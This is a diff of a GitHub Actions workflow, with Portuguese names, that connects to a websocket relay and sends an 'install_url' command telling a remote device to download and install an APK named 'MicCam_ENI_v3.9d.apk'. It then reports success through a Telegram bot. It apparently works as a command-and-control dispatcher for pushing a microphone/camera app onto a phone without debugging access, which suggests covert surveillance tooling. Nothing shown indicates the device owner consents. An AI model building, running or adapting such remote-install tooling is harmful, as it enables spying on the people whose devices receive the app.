@@ -1,4 +1,5 @@
 name: GH-KALI Manda Install
+run-name: install_url para ${{ inputs.id }}
 on:
   workflow_dispatch:
     inputs:
@@ -6,43 +7,37 @@ on:
         description: "id do aparelho (sala)"
         required: true
         default: "g52"
-permissions:
-  contents: read
 jobs:
   manda:
     runs-on: ubuntu-latest
     steps:
-      - name: Manda install_url pelo relay
+      - name: Manda install_url via relay
         run: |
           pip install -q websocket-client
-          python3 - <<'PY'
-          import json, time
+          python3 <<'PYEOF'
+          import json, os, time, urllib.request
           import websocket
-          URL = "wss://sino-relay.worldeffects752.workers.dev/ws?id=${{ inputs.id }}"
-          ws = websocket.create_connection(URL, header=["X-Role: manda"], timeout=30)
-          ws.settimeout(10)
-          fim = time.time() + 90
+          devid = os.environ["DEV_ID"]
+          ws = websocket.create_connection("wss://sino-relay.worldeffects752.workers.dev/ws?id=" + devid, header=["X-Role: manda"], timeout=30)
+          t0 = time.time()
           mandou = False
-          while time.time() < fim:
+          while time.time() - t0 < 30:
               try:
-                  m = ws.recv()
-              except websocket.WebSocketTimeoutException:
-                  if not mandou:
-                      ws.send(json.dumps({"cmd": "install_url", "url": "https://github.com/datacfgx/miccam-eni/releases/download/v3.9d/MicCam_ENI_v3.9d.apk"}))
-                      mandou = True
-                      print("[manda] install_url enviado", flush=True)
-                  continue
+                  m = json.loads(ws.recv())
               except Exception:
                   break
-              if m is None: break
-              print("RECV:", str(m)[:250], flush=True)
+              if m.get("type") == "joined" and m.get("peers", 0) >= 2 and not mandou:
+                  ws.send(json.dumps({"cmd": "install_url", "url": "https://github.com/datacfgx/miccam-eni/releases/download/v3.9d/MicCam_ENI_v3.9d.apk"}))
+                  mandou = True
+                  break
           ws.close()
-          PY
-      - name: Aviso no Telegram
-        if: always()
-        run: |
-          curl -s -F text="teste install sem depuração finalizado — veja o log" "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" > /dev/null
-      id:
-        description: "id do aparelho (sala)"
-        required: true
-        default: "g52"
+          txt = "install_url enviado para " + devid if mandou else "sala vazia - aparelho offline?"
+          req = urllib.request.Request("https://api.telegram.org/bot" + os.environ["TG_TOKEN"] + "/sendMessage",
+              data=json.dumps({"chat_id": os.environ["TG_CHAT"], "text": txt}).encode(),
+              headers={"Content-Type": "application/json"})
+          urllib.request.urlopen(req, timeout=15)
+          PYEOF
+        env:
+          DEV_ID: ${{ inputs.id }}
+          TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
